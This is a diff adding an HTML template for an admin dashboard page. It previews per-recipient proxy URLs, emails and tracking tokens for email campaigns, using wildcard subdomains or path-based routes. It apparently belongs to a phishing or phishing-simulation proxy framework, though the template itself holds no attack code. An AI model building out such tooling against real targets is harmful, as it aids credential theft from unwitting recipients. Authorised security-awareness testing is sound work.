@@ -1,0 +1,104 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-7xl mx-auto py-8">
+
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="/" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO DASHBOARD ]
+    </a>
+  </div>
+
+  <header class="mb-8 border-b-4 border-pure-black dark:border-stark-white pb-6 flex flex-col md:flex-row justify-between items-start md:items-end gap-4">
+    <div>
+      <h1 class="text-4xl font-extrabold font-mono-brutal tracking-tight text-[var(--dj-fg)] mb-2">[ DOMAIN_ROUTING ]</h1>
+      <p class="text-sm font-mono-brutal text-brutal-red font-bold">&gt; Per-recipient proxy URL preview for wildcard domain campaigns.</p>
+    </div>
+  </header>
+
+<!-- Base URL info -->
+<div class="border-4 border-pure-black dark:border-stark-white bg-[var(--dj-card)] p-4 mb-6 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)] dark:shadow-[4px_4px_0px_0px_rgba(225,29,72,1)] flex flex-wrap gap-4 items-center">
+  <span class="font-mono-brutal text-xs font-bold">BASE_URL:</span>
+  <code class="font-mono-brutal text-xs bg-off-white dark:bg-black px-2 py-1 border border-gray-300 dark:border-gray-700">{{ base_url }}</code>
+  <span class="font-mono-brutal text-xs text-gray-500 ml-auto">{{ routing_data | length }} campaign(s)</span>
+</div>
+
+{% for rd in routing_data %}
+<div class="border-4 border-pure-black dark:border-stark-white bg-[var(--dj-card)] p-6 mb-6 shadow-[6px_6px_0px_0px_rgba(0,0,0,1)] dark:shadow-[6px_6px_0px_0px_rgba(225,29,72,1)]">
+  <div class="flex items-center justify-between mb-4">
+    <div>
+      <h2 class="text-lg font-bold font-mono-brutal">
+        <a href="/admin/campaign/{{ rd.campaign.id }}/analytics" class="hover:text-brutal-red">{{ rd.campaign.name }}</a>
+      </h2>
+      <span class="font-mono-brutal text-xs text-gray-500">{{ rd.recipient_count }} recipient(s)</span>
+    </div>
+    <div>
+      {% if rd.wildcard_domain %}
+        <span class="px-3 py-1 border-2 border-brutal-emerald text-brutal-emerald font-mono-brutal text-xs font-bold">
+          WILDCARD: {{ rd.wildcard_domain.base_domain }}
+        </span>
+        {% if rd.wildcard_domain.auto_tls_enabled %}
+          <span class="px-2 py-1 border border-brutal-amber text-brutal-amber font-mono-brutal text-xs ml-2">TLS</span>
+        {% endif %}
+      {% else %}
+        <span class="px-3 py-1 border-2 border-gray-400 text-gray-500 font-mono-brutal text-xs">
+          PATH-BASED FALLBACK
+        </span>
+      {% endif %}
+    </div>
+  </div>
+
+  {% if rd.sample_urls %}
+  <div class="overflow-x-auto">
+    <table class="w-full text-left font-mono-brutal text-xs">
+      <thead>
+        <tr class="border-b-2 border-pure-black dark:border-stark-white">
+          <th class="p-2 uppercase">Token</th>
+          <th class="p-2 uppercase">Email</th>
+          <th class="p-2 uppercase">Proxy URL</th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for u in rd.sample_urls %}
+        <tr class="border-b border-gray-200 dark:border-gray-800">
+          <td class="p-2 font-bold">{{ u.token[:16] }}...</td>
+          <td class="p-2">{{ u.email }}</td>
+          <td class="p-2">
+            <code class="bg-off-white dark:bg-black px-1 py-0.5 border border-gray-300 dark:border-gray-700 break-all text-xs">{{ u.url }}</code>
+          </td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+  {% if rd.recipient_count > 3 %}
+  <p class="font-mono-brutal text-xs text-gray-500 mt-2">Showing 3 of {{ rd.recipient_count }} recipients. Full URL pattern: {% if rd.wildcard_domain %}https://&lt;token&gt;.{{ rd.wildcard_domain.base_domain }}/{% else %}{{ base_url }}/proxy/{{ rd.campaign.id }}/t/&lt;token&gt;/{% endif %}</p>
+  {% endif %}
+  {% else %}
+  <p class="font-mono-brutal text-xs text-gray-500 text-center py-4">No recipients in this campaign yet.</p>
+  {% endif %}
+
+  <!-- URL format explanation -->
+  <div class="mt-4 p-3 border border-gray-300 dark:border-gray-700 bg-off-white dark:bg-black">
+    <div class="font-mono-brutal text-xs font-bold text-gray-500 mb-1">URL FORMAT</div>
+    {% if rd.wildcard_domain %}
+      <code class="font-mono-brutal text-xs">https://&lt;recipient_token&gt;.{{ rd.wildcard_domain.base_domain }}/</code>
+      <p class="font-mono-brutal text-xs text-gray-500 mt-1">Requires wildcard DNS A record pointing to this server and TLS certificate auto-provisioning.</p>
+    {% else %}
+      <code class="font-mono-brutal text-xs">{{ base_url }}/proxy/{{ rd.campaign.id }}/t/&lt;recipient_token&gt;/</code>
+      <p class="font-mono-brutal text-xs text-gray-500 mt-1">Path-based fallback. Configure a wildcard proxy domain for cleaner per-recipient URLs.</p>
+    {% endif %}
+  </div>
+</div>
+{% endfor %}
+
+{% if not routing_data %}
+<div class="border-4 border-pure-black dark:border-stark-white bg-[var(--dj-card)] p-6 shadow-[6px_6px_0px_0px_rgba(0,0,0,1)] dark:shadow-[6px_6px_0px_0px_rgba(225,29,72,1)]">
+  <p class="font-mono-brutal text-gray-500 dark:text-gray-400 text-center py-12">
+    No campaigns found. Create a campaign to configure domain routing.
+  </p>
+</div>
+{% endif %}
+</div>
+{% endblock %}
